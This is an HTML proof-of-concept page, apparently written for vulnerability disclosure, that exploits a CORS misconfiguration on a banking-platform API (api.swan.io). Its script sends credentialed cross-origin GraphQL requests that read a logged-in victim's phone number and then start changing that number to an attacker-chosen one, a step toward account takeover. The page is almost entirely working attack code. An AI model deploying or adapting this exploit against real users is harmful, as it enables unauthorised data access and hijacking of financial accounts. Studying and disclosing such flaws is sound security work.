<!DOCTYPE html>
<meta charset="utf-8">
<title>Swan CORS Critical PoC</title>
<style>
  body { font-family: system-ui; margin: 2rem; }
  pre  { background:#f8f8f8; padding:1rem; border:1px solid #ddd; }
</style>

<h2>⚠️ Swan CORS Misconfiguration PoC ⚠️</h2>
<p>
  Hosted on <strong id="origin"></strong>.  
  Must be tested **after** logging in at <code>dashboard.swan.io</code>.
</p>
<pre id="log">Running…</pre>

<script>
  document.getElementById('origin').textContent = location.origin;
  const log = line => document.getElementById('log').textContent += line + '\n';

  async function gql(path, query) {
    const res = await fetch(`https://api.swan.io${path}`, {
      method: 'POST',
      credentials: 'include',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ query })
    });
    const text = await res.text();
    log(`=== ${path} ===\nStatus: ${res.status}\n${text}\n`);
    return JSON.parse(text).data;
  }

  (async () => {
    // 1) prove cookie is sent & accepted
    const who = await gql('/admin-auth/graphql', '{ user { mobilePhoneNumber } }');
    if (!who || !who.user) {
      log('🔒 Not logged in or cookie not sent – please sign in at dashboard.swan.io and reload.');
      return;
    }
    const oldN = who.user.mobilePhoneNumber;
    log(`✅ Victim’s phone: ${oldN}\n`);

    // 2) perform admin mutation
    const rand = Math.floor(1e7 + Math.random()*9e7);
    const newN = '+336' + String(rand).slice(1);
    log(`▶ Changing ${oldN} → ${newN}`);
    await gql('/admin-auth/graphql', `
      mutation {
        startPhoneNumberModification(input:{
          oldPhoneNumber:"${oldN}",
          newPhoneNumber:"${newN}"
        }) {
          __typename
          ... on StartPhoneNumberModificationSuccessPayload { phoneNumberModification{id} }
          ... on PhoneNumberModificationAlreadyExistsRejection { message }
          ... on TooManyPhoneNumberModificationRejection { message }
        }
      }`);
  })();
</script>
